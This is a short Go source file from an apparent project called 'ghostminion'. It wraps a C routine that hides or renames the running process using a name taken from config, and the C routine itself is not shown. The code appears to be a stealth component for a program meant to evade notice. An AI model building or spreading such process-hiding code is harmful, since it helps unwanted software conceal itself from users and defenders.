package hider

import (
	"C"
	"fmt"
	"ghostminion/config"
	"ghostminion/logger"
	"unsafe"
)

var (
	lgr = logger.GetLogger()
	cfg = config.GetInstance()
)

func Hide() {
	lgr.Debug("Hiding process begins")
	cname := C.CString(cfg.Apps.Hider.NewProcessName)
	defer C.free(unsafe.Pointer(cname))
	ret := C.run_hider(cname)
	if ret != 0 {
		fmt.Println("Hider encountered an error")
	} else {
		fmt.Println("Hider executed successfully")
	}
}
